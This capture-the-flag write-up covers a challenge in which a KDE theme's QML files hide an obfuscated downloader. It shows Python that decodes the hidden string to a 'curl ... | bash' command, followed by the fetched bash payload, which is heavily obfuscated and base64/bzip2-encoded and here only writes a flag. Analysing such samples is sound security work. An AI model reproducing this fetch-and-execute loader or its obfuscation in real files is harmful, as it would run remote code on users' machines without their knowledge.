# Solution  
Look at the file plasmoids/susbutton/contents/ui/main.qml and sus.qml  
The code logic is in main.qml but the variables is in sus.qml. But if translate to python, it does this:  
```
var1   = "clts/acmtifa55d3ao.t s rhp/tiuc."
var2  = "/21d72pldx|a u t:st.dfocf587/yat bh"
var3  = r"/2pldx|Mopqfa99\gyat"
e   = var1 + var2 + var3

l     = 45
denom = 67

zeqzoq = "".join(e[(l*k) % 67] for k in range(l))
zeqzoq += "".join(e[(l*k) % denom] for k in range(l, 67))

print(zeqzoq)
# printed => curl https://static.umdctf.io/fc2af155d587d723/payload.txt | bash
```

Then just run the curl  

```
┌──(zeqzoq㉿zeqzoq)-[~]
└─$ curl https://static.umdctf.io/fc2af155d587d723/payload.txt
  "${@//a2::}"  b"a""s"${@,,}h  ${@//+dIsf/6j=V,}   "${@,}"   <<< "$(    "${@%|:Ye3c}" ${*~}   p""r\i$'\u006e'${*#uGE;Y}t$'\x66'  'QlpoOTFBWSZTWV6+ejAAABOfgECBgAkNAgYAv+/+CiAASIkG1A0aAeU9MoNCKNGEPQIaDCM0Qeq7JjaChSBUQyjnHBfDcziPcgeyD7qxoCheMPpv/DUmqA4vWAxSYbGoBdFjcXckU4UJBevnowA=' ${*^} "${@//ET,\!KUP}"  |   ${*^}   $'\x62''a'${*/CP@h\)6}se''"6"4   -d "${@//X~\}8n/E?\`FJa8}"  | ${@,} ${*//qb15\)$v} bu""nz''ip$((   (-(-(17#1--${*//Lx>vi%P\\}2"${@~~}"1#"1")+8"${@/fhA+3}"#0))   ))  -c   ${*,,} "${@//QB3q^du4}"     )"   "${@,}" "${@//MBAu2D}"
```

decode in cyberchef with From Base64 and Bzip2 Decompress then got  
`echo 'UMDCTF{kde_global_themes_can_be_quite_sus}' > /tmp/.flag; rm /tmp/.flag`  

Flag: `UMDCTF{kde_global_themes_can_be_quite_sus}`



Solved by: zeqzoq
